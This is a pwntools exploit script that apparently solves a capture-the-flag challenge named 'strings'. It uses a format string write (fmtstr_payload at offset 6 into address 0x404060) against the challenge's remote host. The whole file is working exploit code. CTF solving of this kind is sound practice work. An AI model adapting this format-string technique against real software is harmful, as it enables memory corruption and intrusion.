#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'strings')

host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 7150)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main2+87
c
'''.format(**locals())

# -- Exploit goes here --
def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.recvall()
offset = 6 # FmtStr(exec_fmt).offset

io = start()

# lx = 0x786c
payload = fmtstr_payload(offset, {0x404060: 0x73243125}) # 0x73243125 = %1$s
print(payload)
io.sendlineafter(b'strings?', payload)

io.interactive()

